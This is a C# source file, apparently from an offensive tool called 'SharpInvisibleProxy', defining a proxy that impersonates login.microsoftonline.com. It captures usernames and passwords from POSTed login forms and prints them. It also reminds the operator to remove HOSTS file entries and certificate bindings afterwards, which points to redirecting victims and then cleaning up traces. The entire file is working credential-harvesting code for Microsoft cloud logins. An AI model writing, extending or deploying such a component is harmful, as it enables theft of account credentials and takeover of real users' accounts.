using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;

namespace SharpInvisibleProxy
{
    class AADProxy : Proxy
    {

        public AADProxy(string ip, int port)
        {
            this._bindAddr = ip;
            this._bindPort = port;
            this._targethost = "login.microsoftonline.com";
            this._listener = new HttpListener();
        }

        public override void HandlePostRequest(string content)
        {
            // Parse the request body to extract parameters
            var parameters = ParseRequestBody(content);

            // Print specific POST parameters A and B
            if (parameters.ContainsKey("username") && parameters.ContainsKey("password"))
            {
                string parameterA = parameters["username"];
                string parameterB = parameters["password"];

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Username: " + parameterA);
                Console.WriteLine("[+] Password: " + parameterB);
                Console.ResetColor();
                Console.WriteLine("All Done!");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[!] Remember to delete HOST file records and certificate bindings!");
                Console.ResetColor();

            }
        }
    }
}
